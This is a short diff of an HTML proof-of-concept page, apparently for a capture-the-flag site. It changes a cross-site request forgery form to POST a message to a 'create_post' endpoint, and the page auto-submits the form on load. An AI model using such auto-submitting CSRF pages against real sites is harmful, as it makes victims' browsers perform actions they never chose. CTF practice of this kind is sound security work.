@@ -2,7 +2,9 @@
 <html lang="en">
 	<body>
 		<h1>Form CSRF PoC</h1>
-		<form method="GET" action="http://ctf.batmans.kitchen/post/329" id="form">
+		<form method="POST" action="http://ctf.batmans.kitchen/create_post" id="form">
+			<input name="recipient" value="Bane">
+			<input name="content" value="test 2">
 			<input type="submit" value="Submit Request">
 		</form>
 		<script>document.getElementById('form').submit();</script>
